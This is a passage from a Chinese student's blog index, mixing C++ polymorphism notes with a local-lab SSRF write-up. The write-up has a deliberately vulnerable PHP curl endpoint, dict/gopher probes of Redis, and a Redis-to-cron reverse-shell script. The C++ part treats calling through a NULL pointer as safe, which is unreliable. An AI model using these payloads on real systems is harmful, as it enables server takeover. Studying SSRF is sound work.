<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        <span class="function"><span class="keyword">void</span> <span class="title">nf</span><span class="params">()</span></span>&#123;<span class="built_in">printf</span>(<span class="string">"normal f from Base\n"</span>);&#125;;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vf</span><span class="params">()</span></span>&#123;<span class="built_in">printf</span>(<span class="string">"virtual f from Base\n"</span>);&#125;;</div><div class="line">&#125;;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123; <span class="comment">//我今天才知道这个词是派生</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        <span class="function"><span class="keyword">void</span> <span class="title">nf</span><span class="params">()</span></span>&#123;<span class="built_in">printf</span>(<span class="string">"normal f from Derived\n"</span>);&#125;;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vf</span><span class="params">()</span></span>&#123;<span class="built_in">printf</span>(<span class="string">"virtual f from Derived\n"</span>);&#125;;</div><div class="line">&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    Derived d1;</div><div class="line">    Base * b1 = &amp;d1;</div><div class="line">    b1 -&gt; nf();</div><div class="line">    b1 -&gt; vf();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * normal f from Base   //静态</span></div><div class="line"><span class="comment"> * virtual f from Derived   //动态绑定</span></div><div class="line"><span class="comment"> */</span></div></pre></td></tr></table></figure>
<p>如果用引用的话也是一样的结果<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    Derived d1;</div><div class="line">    Base &amp; b1 = d1;</div><div class="line">    b1.nf();</div><div class="line">    b1.vf();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * normal f from Base   //静态</span></div><div class="line"><span class="comment"> * virtual f from Derived   //动态绑定</span></div><div class="line"><span class="comment"> */</span></div></pre></td></tr></table></figure></p>
<p>如果不是用指针或者引用的话,就像下面提到的<code>对象直接赋值</code>,仔细看啊,就比前面的例子少了一个引用符号,结果就很悲剧了!<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    Derived d1;</div><div class="line">    Base b1 = d1;</div><div class="line">    b1.nf();</div><div class="line">    b1.vf();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> * normal f from Base =&gt; 静态</span></div><div class="line"><span class="comment"> * virtual f from Base =&gt; 静态</span></div><div class="line"><span class="comment"> */</span></div></pre></td></tr></table></figure></p>
<p>就是这个厉害的派生对象就废掉了,就变成普通的鸡肋对象了,而且这个时候即便再强制赋值回来也没啥用了 <em>其实是根本赋值不回来了…</em> 继续往下看<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    Derived d1;</div><div class="line">    Base b1 = d1;</div><div class="line">    Derived d2 = b1;</div><div class="line">    b1.nf();</div><div class="line">    b1.vf();</div><div class="line">    d2.nf();</div><div class="line">    d2.vf();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>因为是基类转为子类(其实就没有这种操作),所以会提示你强制转化,然后你准备碰个运气强制一波<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Derived d2 = (Derived)b1;</div></pre></td></tr></table></figure></p>
<p>这个时候就会报一万个<code>error</code>了<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error: no matching function <span class="keyword">for</span> call to ‘Derived::Derived(Base&amp;)’</div></pre></td></tr></table></figure></p>
<p>这个时候我们彻彻底底的相信了,这个对象类型直接赋值是没有传说中的多态出现的,如果我们还要把他弄回去,,还会报错</p>
<p>那我们试一下如果是指针呢,向下转型虽然是危险的,但是不是可行呢<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    Base * b1 = <span class="keyword">new</span> Base;   <span class="comment">// 对了记得用了指针要new一下,不然这就是个野指针了,访问到不可思议的内存就会</span></div><div class="line">    Derived * d1 = (Derived *)b1;</div><div class="line">    b1 -&gt; nf();</div><div class="line">    b1 -&gt; vf();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/* </span></div><div class="line"><span class="comment"> * normal f from Base</span></div><div class="line"><span class="comment"> * virtual f from Base</span></div><div class="line"><span class="comment"> */</span></div></pre></td></tr></table></figure></p>
<p>还有这种操作? 确实是可以的,但是么有什么意义</p>
<p>好吧我只有一个疑问了,就是赋值来来回回<code>Derived</code>=&gt;<code>Base</code>=&gt;<code>Derived</code>,这样子一圈下来还能安好咩<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    Derived * d1 = <span class="keyword">new</span> Derived;</div><div class="line">    Base * b1 = d1;</div><div class="line">    Derived * d2 = (Derived *)b1;</div><div class="line">    d1 -&gt; nf();</div><div class="line">    d1 -&gt; vf();</div><div class="line"></div><div class="line">    b1 -&gt; nf();</div><div class="line">    b1 -&gt; vf();</div><div class="line"></div><div class="line">    d2 -&gt; nf();</div><div class="line">    d2 -&gt; vf();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* normal f from Derived</span></div><div class="line"><span class="comment"> * virtual f from Derived</span></div><div class="line"><span class="comment"> * normal f from Base</span></div><div class="line"><span class="comment"> * virtual f from Derived</span></div><div class="line"><span class="comment"> * normal f from Derive     =&gt; 安好</span></div><div class="line"><span class="comment"> * virtual f from Derived   =&gt; 安好</span></div><div class="line"><span class="comment"> */</span></div></pre></td></tr></table></figure></p>
<p>好吧,果然还是安好的,其实早就应该想到指针这样丢来丢去,根本不会影响到内存中Derived实例的结构</p>
<p>其实上面的这个<code>nf</code>是与多态无关的,静态时候决定,就是用谁的指针,就是调用谁的函数,所以刚刚还偷偷试了下<br>即便这样子,还是能输出这个<code>nf</code>,大概这就是命(划掉,静态)吧,编译时候就决定好了的东西<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    Derived * d1 = <span class="literal">NULL</span>;</div><div class="line">    d1 -&gt; nf();</div><div class="line">    d1 -&gt; vf();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="派生类向基类的隐式转换"><a href="#派生类向基类的隐式转换" class="headerlink" title="派生类向基类的隐式转换"></a>派生类向基类的隐式转换</h3><p>hack点: 基类不能向派生类隐式转换,即使是<code>派生=&gt; 基本类 =&gt; 派生</code>这样子的也不可以就是说原来是把一个派生类对象地址丢给了基本类的指针变量(这一步合理合情合法),再把这个变量丢给派生类对象指针也不行,即便他指的其实是派生类对象(这里是说隐式转换,我们可暴力的进行转换,就像我上面的例子,只是说隐式转换的话编译器不给你过)</p>
<blockquote>
<p>当然必要的时候也可以强制向下转型? 虽然很危险.(人家都说危险,我也觉得它危险好了)</p>
</blockquote>
<p>hack点: 这些奇怪的各种各样为了实现多态的转换之类的,都是<code>指针</code>或者<code>引用</code>的操作,所以直接对象直接赋值是没啥用的,比如:如果用一个派生类对象给一个基类对象初始化或者赋值,只有基类的那一部分会被复制,派生类部分会直接被忽略(切割掉)</p>
<h2 id="继承-挖坑-然后填"><a href="#继承-挖坑-然后填" class="headerlink" title="继承 (挖坑,然后填)"></a>继承 (挖坑,然后填)</h2><h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><p>感觉像是接口,java里就不能多重继承</p>
<h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><h3 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h3>]]></content>
      
        
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[跳转]]></title>
      <url>/2017/06/02/%E8%B7%B3%E8%BD%AC/</url>
      <content type="html"><![CDATA[<h2 id="服务器跳转"><a href="#服务器跳转" class="headerlink" title="服务器跳转"></a>服务器跳转</h2><h2 id="客户端跳转"><a href="#客户端跳转" class="headerlink" title="客户端跳转"></a>客户端跳转</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hack0nair.me/2013-04-24-e9-a1-b5-e9-9d-a2-e8-b7-b3-e8-bd-ac-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/" target="_blank" rel="external">https://hack0nair.me/2013-04-24-e9-a1-b5-e9-9d-a2-e8-b7-b3-e8-bd-ac-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e5-bc-8f/</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[ssrf从入门到入门]]></title>
      <url>/2017/06/02/ssrf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>在hosts里面绑了个<code>www.eval.com</code><br>mkdir了个ssrf文件夹放相关的的文件<br>比如<code>index.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$ch = curl_init(); </div><div class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </div><div class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></div><div class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </div><div class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></div><div class="line">curl_exec($ch); </div><div class="line">curl_close($ch); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><h4 id="dict获取redis信息"><a href="#dict获取redis信息" class="headerlink" title="dict获取redis信息"></a>dict获取redis信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>@linux: curl http://www.eval.com/ssrf/?url=dict://127.0.0.1:6379/info</div><div class="line"></div><div class="line"><span class="comment"># Server</span></div><div class="line">redis_version:3.0.6</div><div class="line">redis_git_sha1:00000000</div><div class="line">redis_git_dirty:0</div><div class="line">...</div></pre></td></tr></table></figure>
<p>获取ssh信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://www.eval.com/ssrf/index.php?url=dict://127.0.0.1:22/info'</span></div></pre></td></tr></table></figure></p>
<h4 id="gopher回显数据"><a href="#gopher回显数据" class="headerlink" title="gopher回显数据"></a>gopher回显数据</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span>@attacker: curl -v <span class="string">'http://www.eval.com/ssrf/index.php?url=gopher://127.0.0.1:2333/_Hello'</span></div><div class="line"></div><div class="line">haibin@caiji: nc -l -vv 2333</div><div class="line">Listening on [0.0.0.0] (family 0, port 2333)</div><div class="line">Hello</div></pre></td></tr></table></figure>
<p>可以测试确认是不是能用gopher</p>
<h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>dict://ip:port/command:data1:data2 向服务器的端口请求<code>command data1 data2</code><br>所以<br><code>curl dict://127.0.0.1:6379/info</code><br>其实就相当于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">haibin@pc: nc 127.0.0.1 6379</div><div class="line">info</div></pre></td></tr></table></figure></p>
<p>所以可以一步一步构造<br>gopher可以一键getshell<br>而dict要一步一步构造</p>
<h2 id="看人家这个redis反弹shell"><a href="#看人家这个redis反弹shell" class="headerlink" title="看人家这个redis反弹shell"></a>看人家这个redis反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</div><div class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</div></pre></td></tr></table></figure>
<p>然后跑<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash shell.sh 127.0.0.1 6379</div></pre></td></tr></table></figure></p>
<p>$1: 127.0.0.1<br>$2: 6379</p>
<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl gopher://ip:port/_payload</div></pre></td></tr></table></figure>
<p>有个下划线咩<br>具体payload怎么写,要抓流量,相当于是重放攻击,就是把执行操作时候实际来往的流量抓下来(不知道这麽说对不对)<br>所以可用<code>socat -v</code> (-v是显示详细信息,利用这个详细信息写payload咩)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</div></pre></td></tr></table></figure></p>
<p>然后利用gopher转换规则</p>
<ul>
<li>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。</li>
<li>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。</li>
<li>将\r字符串替换成%0d%0a</li>
<li>空白行替换为%0a</li>
</ul>
<p>最后如果<code>gophar://xxx:6379/_payload</code>要作为url参数的话就得要<code>urlencode</code>一下的</p>
<p>这部分参考<br><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">http://joychou.org/index.php/web/phpssrf.html</a><br>很详细</p>
<h2 id="常常看到的302-php"><a href="#常常看到的302-php" class="headerlink" title="常常看到的302.php"></a>常常看到的302.php</h2><p><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">http://blog.feei.cn/ssrf/</a><br>这篇写的真的超级清楚</p>
<p>自己拿vps挂个302.php跳一下不是必须的<br>是在某种情况(限制了可用协议为http(s),但支持CURLOPT_FOLLOWLOCATION)下的周转措施</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.91ri.org/17111.html" target="_blank" rel="external">http://www.91ri.org/17111.html</a> (ssrf)<br><a href="http://www.dict.org/rfc2229.txt" target="_blank" rel="external">http://www.dict.org/rfc2229.txt</a> (dict协议)<br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a> (反弹shell方法)<br><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a> (没看懂)<br><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">http://joychou.org/index.php/web/phpssrf.html</a> (ssrf 超级详细)<br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">http://blog.feei.cn/ssrf/</a><br><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">https://blog.chaitin.cn/gopher-attack-surfaces/</a> (长亭)<br><a href="http://blog.feei.cn/redis/" target="_blank" rel="external">http://blog.feei.cn/redis/</a> (redis to getshell) 超详细<br><a href="http://www.freebuf.com/articles/web/20407.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20407.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[off by one]]></title>
      <url>/2017/06/02/off-by-one/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[路由器和交换机都有哪些表]]></title>
      <url>/2017/06/01/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8C%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%A1%A8/</url>
      <content type="html"><![CDATA[<blockquote>
<p>我的是Linux,不知道win是不是差不多</p>
</blockquote>
<h2 id="路由器-amp-PC"><a href="#路由器-amp-PC" class="headerlink" title="路由器 &amp; PC"></a>路由器 &amp; PC</h2><h3 id="ARP表"><a href="#ARP表" class="headerlink" title="ARP表"></a>ARP表</h3><h4 id="pc"><a href="#pc" class="headerlink" title="pc"></a>pc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">arp [-a]        两种不同的显示arp表的方法</div><div class="line">arp -d          删除</div></pre></td></tr></table></figure>
<h4 id="router"><a href="#router" class="headerlink" title="router"></a>router</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">show arp        显示arp表</div><div class="line">no arp          删除</div></pre></td></tr></table></figure>
<h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><h4 id="pc-1"><a href="#pc-1" class="headerlink" title="pc"></a>pc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -r</div></pre></td></tr></table></figure>
<h4 id="router-1"><a href="#router-1" class="headerlink" title="router"></a>router</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">show ip route</div><div class="line">no ip route</div></pre></td></tr></table></figure>
<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><h3 id="CAM表"><a href="#CAM表" class="headerlink" title="CAM表"></a>CAM表</h3><p>这个应该就是传说中的<code>MAC</code>和交换机接口对应的表</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>netstat命令 <a href="https://linux.cn/article-2434-1.html" target="_blank" rel="external">https://linux.cn/article-2434-1.html</a><br>多层交换概述 <a href="https://wenku.baidu.com/view/5e4111976bec0975f465e203.html" target="_blank" rel="external">https://wenku.baidu.com/view/5e4111976bec0975f465e203.html</a><br>多层交换机与路由器 <a href="http://network.pconline.com.cn/474/4741916.html" target="_blank" rel="external">http://network.pconline.com.cn/474/4741916.html</a><br>MAC表含义 <a href="http://skyeagle.blog.51cto.com/417071/93338" target="_blank" rel="external">http://skyeagle.blog.51cto.com/417071/93338</a></p>
]]></content>
      
        
        <tags>
            
            <tag> network </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sed]]></title>
      <url>/2017/05/30/sed/</url>
      <content type="html"><![CDATA[<p>日后填坑</p>
]]></content>
      
        
        <tags>
            
            <tag> sed </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[awk]]></title>
      <url>/2017/05/30/awk/</url>
      <content type="html"><![CDATA[<p>只能每天记一点辣</p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>刚开始就只记录一些简单的用法好了<br>基本使用姿势<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN&#123; commands &#125; pattern&#123; commands &#125; END&#123; commands &#125;&apos;</div></pre></td></tr></table></figure></p>
<p>看有三部分 <code>BEGIN</code>, <code>pattern</code>, <code>END</code>, 每部分都可有可无</p>
<p>最简单的只有<code>pattern</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">haibin:~$ last -n 5</div><div class="line"></div><div class="line">haibin   tty7         :0               Tue May 30 14:18    gone - no logout</div><div class="line">reboot   system boot  4.4.0-59-generic Tue May 30 14:16   still running</div><div class="line">haibin   tty7         :0               Mon May 29 10:02 - down   (12:32)</div><div class="line">reboot   system boot  4.4.0-59-generic Mon May 29 10:00 - 22:34  (12:34)</div><div class="line">haibin   tty7         :0               Sun May 28 13:33 - crash  (20:26)</div></pre></td></tr></table></figure>
<p>使用awk<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">haibin:~$ last -n 5 | awk &apos;&#123;print $1&#125;&apos;</div><div class="line"></div><div class="line">haibin</div><div class="line">reboot</div><div class="line">haibin</div><div class="line">reboot</div><div class="line">haibin</div></pre></td></tr></table></figure></p>
<p>看出来了吧,,, $1是第一个域,$2…,$0是所有的,所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">haibin:~$ last -n 5 | awk &apos;&#123;print $0&#125;&apos;</div><div class="line">haibin:~$ last -n 5 | awk &apos;&#123;print &#125;&apos;</div><div class="line">haibin:~$ last -n 5</div></pre></td></tr></table></figure></p>
<p>是一样的</p>
<p><code>-F</code> 可以指定分隔符(默认是空格)<br>比如在<code>cat /etc/passwd</code>的时候就要用<code>-F :</code></p>
<h2 id="每部分"><a href="#每部分" class="headerlink" title="每部分"></a>每部分</h2><p><code>BEGIN</code> 可以做表头<br><code>END</code> 可以做最后信息的输出<br><code>pattern</code> 可以是正则,只匹配对应的行</p>
<p>patern (r开头的)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">cat /etc/passwd | awk -F : &apos;/^r/&#123;print &quot;user: &quot; $1 &quot;\t shell: &quot; $7&#125;&apos;</div><div class="line"></div><div class="line"></div><div class="line">user: root	 shell: /bin/bash</div><div class="line">user: rtkit	 shell: /bin/false</div><div class="line">user: redis	 shell: /bin/false</div></pre></td></tr></table></figure></p>
<p>加个BEGIN<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cat /etc/passwd | awk -F : &apos;BEGIN&#123;print &quot;user\tshell&quot;&#125; /^r/&#123;print  $1 &quot;\t&quot; $7&#125;&apos;</div><div class="line"></div><div class="line"></div><div class="line">user	shell</div><div class="line">root	/bin/bash</div><div class="line">rtkit	/bin/false</div><div class="line">redis	/bin/false</div></pre></td></tr></table></figure></p>
<p>加个END (统计个数)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">cat /etc/passwd | awk -F : &apos;BEGIN&#123;i=0;print &quot;user\tshell&quot;&#125; /^r/&#123;i++;print  $1 &quot;\t&quot; $7&#125; END&#123;print &quot;total\t&quot;, i, &quot;users&quot;&#125;&apos;</div><div class="line"></div><div class="line">user	shell</div><div class="line">root	/bin/bash</div><div class="line">rtkit	/bin/false</div><div class="line">redis	/bin/false</div><div class="line">total	 3 users</div></pre></td></tr></table></figure></p>
<p>不过我这边用正则怎么有点问题</p>
<h2 id="从入门到入门"><a href="#从入门到入门" class="headerlink" title="从入门到入门"></a>从入门到入门</h2><p>今天没有时间入门了,来日方长</p>
]]></content>
      
        
        <tags>
            
            <tag> awk </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[redis]]></title>
      <url>/2017/05/30/redis/</url>
      <content type="html"><![CDATA[<p>想学一下redis<br>然后还想学一下前端构建工具<br>还有socket.io…</p>
<p>redis在ssrf里有很重要的作用<br>除此之外,其实确实想学好久了,等我有时间</p>
<p>先mark一下这个<br><a href="http://blog.just4fun.site/learn-redis.html" target="_blank" rel="external">http://blog.just4fun.site/learn-redis.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> redis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[bash]]></title>
      <url>/2017/05/30/bash/</url>
      <content type="html"><![CDATA[<p>一直以来,不会用bash<br>我觉得语法好他喵的奇怪的,<br>昨天和zjm聊了下,,,原来我不是一个人<br>我是没办法去学这个…宁可用不太熟悉的py</p>
<p>然后搜到了这个<br><a href="http://blog.just4fun.site/shell-and-shellpy.html" target="_blank" rel="external">http://blog.just4fun.site/shell-and-shellpy.html</a><br>还有同一个作者的<br><a href="http://blog.just4fun.site/Python-for-system-administrators.html" target="_blank" rel="external">http://blog.just4fun.site/Python-for-system-administrators.html</a></p>
<p>ps 确实看到好多人推荐fish</p>
<p>喔,然后学一下awk, sed</p>
<p>恩,暂时我还是用这个好了<br><a href="http://amoffat.github.io/sh/" target="_blank" rel="external">http://amoffat.github.io/sh/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python-getattr]]></title>
      <url>/2017/05/30/python-getattr/</url>
